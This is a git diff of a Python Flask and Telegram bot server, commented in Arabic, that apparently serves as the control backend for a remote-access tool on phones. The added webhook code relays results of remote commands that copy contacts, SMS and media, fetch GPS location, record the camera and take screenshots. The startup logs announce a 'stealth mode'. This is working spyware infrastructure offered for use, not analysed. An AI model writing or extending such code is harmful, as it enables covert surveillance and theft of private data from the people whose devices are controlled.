@@ -99,138 +99,253 @@ def status():
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    """استقبال webhook من Telegram"""
+    """استقبال النتائج من خادم الأوامر"""
     try:
-        update = request.get_json()
-        if update:
-            # معالجة التحديث في خيط منفصل
-            threading.Thread(target=process_update, args=(update,)).start()
-            return jsonify({"status": "ok"})
-        return jsonify({"status": "no update"})
+        # التحقق من التوكن
+        auth_token = request.headers.get('X-Auth-Token')
+        if auth_token != os.environ.get('WEBHOOK_SECRET', 'secret'):
+            return jsonify({'error': 'Unauthorized'}), 401
+        
+        data = request.get_json()
+        command = data.get('command')
+        result = data.get('result')
+        error = data.get('error')
+        timestamp = data.get('timestamp')
+        
+        flask_logger.info(f"📨 استقبال نتيجة أمر: {command}")
+        
+        if command == 'backup_contacts':
+            if error:
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"❌ فشل في نسخ جهات الاتصال:\n{error}"
+                )
+            else:
+                contacts_count = result.get('count', 0) if result else 0
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"✅ تم نسخ جهات الاتصال بنجاح!\n"
+                    f"📊 عدد الجهات: {contacts_count}\n"
+                    f"📅 التاريخ: {datetime.fromtimestamp(timestamp/1000).strftime('%Y-%m-%d %H:%M')}"
+                )
+        
+        elif command == 'backup_sms':
+            if error:
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"❌ فشل في نسخ الرسائل النصية:\n{error}"
+                )
+            else:
+                sms_count = result.get('count', 0) if result else 0
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"✅ تم نسخ الرسائل النصية بنجاح!\n"
+                    f"📊 عدد الرسائل: {sms_count}\n"
+                    f"📅 التاريخ: {datetime.fromtimestamp(timestamp/1000).strftime('%Y-%m-%d %H:%M')}"
+                )
+        
+        elif command == 'backup_media':
+            if error:
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"❌ فشل في نسخ الوسائط:\n{error}"
+                )
+            else:
+                media_count = result.get('count', 0) if result else 0
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"✅ تم نسخ الوسائط بنجاح!\n"
+                    f"📊 عدد الملفات: {media_count}\n"
+                    f"📅 التاريخ: {datetime.fromtimestamp(timestamp/1000).strftime('%Y-%m-%d %H:%M')}"
+                )
+        
+        elif command == 'get_location':
+            if error:
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"❌ فشل في الحصول على الموقع:\n{error}"
+                )
+            else:
+                location = result.get('location', {}) if result else {}
+                lat = location.get('latitude', 'غير محدد')
+                lng = location.get('longitude', 'غير محدد')
+                accuracy = location.get('accuracy', 'غير محدد')
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"📍 تم الحصول على الموقع بنجاح!\n"
+                    f"🌍 خط العرض: {lat}\n"
+                    f"🌍 خط الطول: {lng}\n"
+                    f"🎯 الدقة: {accuracy} متر\n"
+                    f"📅 التاريخ: {datetime.fromtimestamp(timestamp/1000).strftime('%Y-%m-%d %H:%M')}"
+                )
+        
+        elif command == 'record_camera':
+            if error:
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"❌ فشل في تسجيل الكاميرا:\n{error}"
+                )
+            else:
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"📷 تم تسجيل الكاميرا بنجاح!\n"
+                    f"📁 تم حفظ الفيديو\n"
+                    f"📅 التاريخ: {datetime.fromtimestamp(timestamp/1000).strftime('%Y-%m-%d %H:%M')}"
+                )
+        
+        elif command == 'take_screenshot':
+            if error:
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"❌ فشل في التقاط لقطة الشاشة:\n{error}"
+                )
+            else:
+                bot.send_message(
+                    int(os.environ.get('OWNER_USER_ID', 985612253)),
+                    f"📸 تم التقاط لقطة الشاشة بنجاح!\n"
+                    f"📁 تم حفظ الصورة\n"
+                    f"📅 التاريخ: {datetime.fromtimestamp(timestamp/1000).strftime('%Y-%m-%d %H:%M')}"
+                )
+        
+        return jsonify({'status': 'success'}), 200
+        
     except Exception as e:
-        flask_logger.error(f"Webhook error: {e}")
-        return jsonify({"error": str(e)}), 500
-
-def process_update(update):
-    """معالجة التحديث من Telegram"""
-    try:
-        bot.process_new_updates([update])
-        bot_status["last_activity"] = datetime.now().isoformat()
-    except Exception as e:
-        flask_logger.error(f"Update processing error: {e}")
+        flask_logger.error(f"❌ خطأ في webhook: {e}")
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/restart', methods=['POST'])
 def restart_bot():
     """إعادة تشغيل البوت"""
     try:
+        # التحقق من التوقيع
+        auth_token = request.headers.get('X-Auth-Token')
+        if auth_token != os.environ.get('AUTH_TOKEN'):
+            return jsonify({"error": "Unauthorized"}), 401
+            
         flask_logger.info("Restarting bot...")
-        bot_status["restart_count"] += 1
+        global bot_running, bot_thread
         
         # إيقاف البوت الحالي
-        bot.stop_polling()
+        with bot_lock:
+            if bot_running:
+                bot.stop_polling()
+                bot_running = False
+                if bot_thread.is_alive():
+                    bot_thread.join(timeout=10)
         
         # إعادة تشغيل البوت
-        threading.Thread(target=start_bot_safely).start()
+        time.sleep(3)  # انتظار للتأكد من الإيقاف
+        start_bot_safely()
         
-        return jsonify({
-            "status": "restarting",
-            "message": "Bot restart initiated",
-            "restart_count": bot_status["restart_count"]
-        })
+        return jsonify({"status": "restarting"})
     except Exception as e:
-        flask_logger.error(f"Restart error: {e}")
-        return jsonify({"error": str(e)}), 500
-
-@app.route('/stats')
-def stats():
-    """إحصائيات البوت"""
-    try:
-        conn = sqlite3.connect(DB_FILE)
-        cursor = conn.cursor()
-        
-        # إحصائيات الأجهزة
-        cursor.execute('SELECT COUNT(*) FROM devices')
-        total_devices = cursor.fetchone()[0]
-        
-        cursor.execute('SELECT COUNT(*) FROM devices WHERE status = "active"')
-        active_devices = cursor.fetchone()[0]
-        
-        # إحصائيات الأوامر
-        cursor.execute('SELECT COUNT(*) FROM commands')
-        total_commands = cursor.fetchone()[0]
-        
-        cursor.execute('SELECT COUNT(*) FROM commands WHERE status = "completed"')
-        completed_commands = cursor.fetchone()[0]
-        
-        cursor.execute('SELECT COUNT(*) FROM commands WHERE status = "pending"')
-        pending_commands = cursor.fetchone()[0]
-        
-        conn.close()
-        
-        return jsonify({
-            "devices": {
-                "total": total_devices,
-                "active": active_devices,
-                "inactive": total_devices - active_devices
-            },
-            "commands": {
-                "total": total_commands,
-                "completed": completed_commands,
-                "pending": pending_commands,
-                "failed": total_commands - completed_commands - pending_commands
-            },
-            "bot": bot_status
-        })
-    except Exception as e:
-        flask_logger.error(f"Stats error: {e}")
+        flask_logger.error(f"Restart failed: {e}")
         return jsonify({"error": str(e)}), 500
 
 def run_bot():
     """تشغيل البوت في خيط منفصل"""
+    global bot_status, bot_running
     try:
-        flask_logger.info("Starting bot...")
+        # التحقق من وجود Token
+        bot_token = os.environ.get('TELEGRAM_BOT_TOKEN')
+        if not bot_token:
+            bot_logger.error("❌ TELEGRAM_BOT_TOKEN غير موجود في المتغيرات البيئية")
+            return
+        
+        owner_id = os.environ.get('OWNER_USER_ID')
+        if not owner_id:
+            bot_logger.error("❌ OWNER_USER_ID غير موجود في المتغيرات البيئية")
+            return
+        
+        bot_logger.info("🚀 بدء تشغيل بوت التحكم في الأجهزة...")
+        bot_logger.info("✅ تم تهيئة النظام بنجاح")
+        bot_logger.info("🔒 وضع الأمان مفعل")
+        bot_logger.info("👻 وضع التخفي مفعل")
+        bot_logger.info("💾 التخزين المحلي مفعل")
+        bot_logger.info(f"🔑 Token موجود: {'نعم' if bot_token else 'لا'}")
+        bot_logger.info(f"👤 معرف المالك: {owner_id}")
+        
         bot_status["running"] = True
         bot_status["start_time"] = time.time()
+        bot_status["restart_count"] += 1
         
         # إعداد المستخدمين المصرح لهم
         setup_authorized_users()
         
-        # بدء البوت
-        bot.polling(none_stop=True, timeout=60)
+        # إيقاف أي polling سابق
+        try:
+            bot.stop_polling()
+            time.sleep(2)  # انتظار لإيقاف كامل
+        except:
+            pass
+        
+        # تشغيل البوت مع إعدادات محسنة لتجنب التضارب
+        bot.polling(
+            none_stop=True, 
+            interval=3, 
+            skip_pending=True, 
+            timeout=60,
+            allowed_updates=['message', 'callback_query']
+        )
         
     except Exception as e:
-        flask_logger.error(f"Bot error: {e}")
+        bot_logger.error(f"خطأ في تشغيل البوت: {e}")
         bot_status["running"] = False
     finally:
         bot_status["running"] = False
+        bot_running = False
 
 def update_activity():
-    """تحديث نشاط البوت"""
+    """تحديث آخر نشاط"""
     while True:
         try:
-            if bot_status["running"]:
-                bot_status["last_activity"] = datetime.now().isoformat()
+            bot_status["last_activity"] = time.time()
+            
+            # تحديث إحصائيات الأجهزة
+            conn = sqlite3.connect(DB_FILE)
+            cursor = conn.cursor()
+            cursor.execute('SELECT COUNT(*) FROM devices WHERE status = "active"')
+            active_devices = cursor.fetchone()[0]
+            
+            cursor.execute('SELECT COUNT(*) FROM commands WHERE status = "pending"')
+            pending_commands = cursor.fetchone()[0]
+            conn.close()
+            
+            bot_status["active_devices"] = active_devices
+            bot_status["pending_commands"] = pending_commands
+            
             time.sleep(60)  # تحديث كل دقيقة
         except Exception as e:
-            flask_logger.error(f"Activity update error: {e}")
+            flask_logger.error(f"Activity update failed: {e}")
+            time.sleep(30)
+
+# متغير للتحكم في تشغيل البوت
+bot_running = False
+bot_lock = threading.Lock()
 
 def start_bot_safely():
     """تشغيل البوت بشكل آمن"""
-    try:
-        run_bot()
-    except Exception as e:
-        flask_logger.error(f"Safe bot start error: {e}")
-        bot_status["running"] = False
+    global bot_running, bot_thread
+    with bot_lock:
+        if bot_running:
+            flask_logger.info("البوت يعمل بالفعل")
+            return
+        
+        bot_running = True
+        bot_thread = threading.Thread(target=run_bot, daemon=True)
+        bot_thread.start()
+        flask_logger.info("تم بدء تشغيل البوت")
 
-if __name__ == '__main__':
-    # بدء خيط البوت
-    bot_thread = threading.Thread(target=start_bot_safely, daemon=True)
-    bot_thread.start()
-    
-    # بدء خيط تحديث النشاط
-    activity_thread = threading.Thread(target=update_activity, daemon=True)
-    activity_thread.start()
-    
-    # تشغيل Flask
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=False)
+# بدء تشغيل البوت عند التحميل
+start_bot_safely()
+
+# بدء تحديث النشاط
+activity_thread = threading.Thread(target=update_activity, daemon=True)
+activity_thread.start()
+
+if __name__ == "__main__":
+    # تشغيل Flask app
+    port = int(os.environ.get('PORT', 10002))
+    flask_logger.info(f"🌐 تشغيل Flask app على المنفذ: {port}")
+    flask_logger.info(f"🔗 رابط الخدمة: https://remote-control-telegram-bot.onrender.com")
+    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
